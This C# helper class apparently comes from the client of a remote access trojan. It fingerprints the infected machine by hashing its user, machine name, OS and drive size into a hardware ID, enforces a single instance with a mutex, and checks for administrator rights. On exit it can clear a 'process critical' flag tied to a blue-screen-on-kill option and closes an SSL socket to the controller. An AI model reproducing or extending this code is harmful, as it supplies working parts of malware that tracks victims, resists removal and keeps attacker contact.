using Client.Sockets;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace Client.Helper
{
   static class Methods
    {
        public static string HWID()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append(Environment.ProcessorCount);
            sb.Append(Environment.UserName);
            sb.Append(Environment.MachineName);
            sb.Append(Environment.OSVersion);
            sb.Append(new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
            return GetHash(sb.ToString());
        }

        public static string GetHash(string strToHash)
        {
            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
            bytesToHash = md5Obj.ComputeHash(bytesToHash);
            StringBuilder strResult = new StringBuilder();
            foreach (byte b in bytesToHash)
                strResult.Append(b.ToString("x2"));
            return strResult.ToString().Substring(0, 15).ToUpper();
        }

        private static Mutex _appMutex;
        public static bool CreateMutex()
        {
            bool createdNew;
            _appMutex = new Mutex(false, Settings.MTX, out createdNew);
            return createdNew;
        }
        public static void CloseMutex()
        {
            if (_appMutex != null)
            {
                _appMutex.Close();
                _appMutex = null;
            }
        }

        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static void ClientExit()
        {
                if (Convert.ToBoolean(Settings.BDOS) && IsAdmin())
                    ProcessCritical.Exit();
            CloseMutex();
            ClientSocket.SslClient?.Close();
            ClientSocket.Client?.Close();
        }
    }
}
